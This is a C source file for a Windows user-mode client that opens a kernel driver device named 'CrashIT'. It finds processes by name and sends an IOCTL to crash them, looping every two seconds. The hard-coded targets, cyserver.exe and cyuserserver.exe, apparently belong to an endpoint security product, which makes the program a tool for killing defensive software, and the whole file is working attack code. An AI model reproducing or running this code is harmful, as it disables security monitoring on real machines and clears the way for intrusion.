#include <windows.h>
#include <stdio.h>
#include "defines.h"

#define IOCTL_CRASHIT CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _CRASHIT_INPUT
{
	ULONG Pid;
} CRASHIT_INPUT, * PCRASHIT_INPUT;


DWORD findProc(LPCWSTR processName) {

	DWORD pid = 0;

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	if (!hNtdll) {
		wprintf(L"[-] Failed to get handle to ntdll.dll\n");
		return 0;
	}

	fnNtQuerySystemInformation NtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		wprintf(L"[-] Failed to get address of NtQuerySystemInformation\n");
		return 0;
	}

	NTSTATUS status;
	ULONG returnLength = 0;
	status = NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &returnLength);

	if (status != STATUS_INFO_LENGTH_MISMATCH) {
		wprintf(L"[-] NtQuerySystemInformation failed to get required buffer size\n");
		return 0;
	}

	PVOID buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLength);
	if (!buffer) {
		wprintf(L"[-] Failed to allocate memory for process information\n");
		return 0;
	}

	status = NtQuerySystemInformation(SystemProcessInformation, buffer, returnLength, &returnLength);

	if (!NT_SUCCESS(status)) {
		wprintf(L"[-] NtQuerySystemInformation failed\n");
		HeapFree(GetProcessHeap(), 0, buffer);
		return 0;
	}

	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
	while (TRUE) {
		if (pInfo->ImageName.Buffer && _wcsicmp(pInfo->ImageName.Buffer, processName) == 0) {
			pid = (DWORD)(ULONG_PTR)pInfo->UniqueProcessId;
			break;
		}

		if (pInfo->NextEntryOffset == 0) {
			break;
		}

		pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset);

	}

	HeapFree(GetProcessHeap(), 0, buffer);
	return pid;
}

BOOL CrashProcess(HANDLE hDevice, PCWSTR processName) {

	DWORD pid = findProc(processName);

	if (pid == 0) {
		wprintf(L"[-] Failed to find process %ls\n", processName);
		return FALSE;
	}

	DWORD bytesReturned;
	CRASHIT_INPUT crashInput;
	crashInput.Pid = pid;

	BOOL success = DeviceIoControl(
		hDevice,
		IOCTL_CRASHIT,
		&crashInput,
		sizeof(CRASHIT_INPUT),
		NULL,
		0,
		&bytesReturned,
		NULL
	);


	if (!success) {
		wprintf(L"[-] DeviceIoControl failed: %d\n", GetLastError());
		CloseHandle(hDevice);
		return FALSE;
	}

	wprintf(L"[+] Process %ls (PID: %lu) corrupted successfully.\n", processName, pid);
	
	return TRUE;
}


int main(int argc, char* argv[])
{
	PCWSTR processName = L"notepad.exe";

	const wchar_t* processNames[] = {
		L"cyserver.exe",
		L"cyuserserver.exe",
	};

	HANDLE hDevice = CreateFileW(
		L"\\\\.\\CrashIT",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Failed to open device: %d\n", GetLastError());
		return 1;
	}

	DWORD procCount = sizeof(processNames) / sizeof(processNames[0]);

	while (TRUE) {

		for (size_t i = 0; i < procCount; i++) {
			processName = processNames[i];
			if (!CrashProcess(hDevice, processName)) {
				wprintf(L"[-] Failed to crash process %ls\n", processName);
			}
		}

		Sleep(2000);
	}

	return 0;
}